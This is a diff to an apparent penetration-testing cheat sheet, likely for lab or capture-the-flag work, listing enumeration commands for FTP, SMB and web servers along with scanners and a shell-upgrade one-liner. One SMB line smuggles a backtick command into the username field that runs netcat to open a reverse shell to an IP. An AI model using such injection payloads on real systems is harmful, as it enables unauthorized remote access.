@@ -3,6 +3,10 @@
 * Run these for enummm! :
 $ autorecon ip
 
+Enum leak:
+services/version exploit
+services/version webshell plugin
+
 Port 21 FTP
 $ ftp ipadd
 $ info || put file.txt (cek info and put file)
@@ -20,6 +24,7 @@ $ smbclient //IP/tmp -U "./=`nohup nc -e /bin/sh IP 443`" -> run nc
 Port 80 web server
 $ dirsearch -u http://yourip, OR
 $ gobuster dir -w raft-medium txt,php/hsp,aspx -u http://yourip -t 50 -b 404,403 -o file.log
+$ gobuster dns -d domain.com
 $ echo IP domain >> //et/hosts
 $	dirb domain wordlist
 $	gobuster -u IP -w wordlist -t 20 -x php,txt
@@ -29,6 +34,7 @@ $	wfuzz -u domain -H "Host: FUZZ.domain" -w wordlist -hh 315
 $	feroxbuster -u domain -x php -w wordlist -k
 $	ffuz -u domain -d "request" -w wordlist -H "header" (seclist/fuzz,specialchar)
 $	wpscan -e --url domain
+$ joomscan
 
 Better shell:
 python3 -c "import pty;pty.spawn('/bin/bash')"
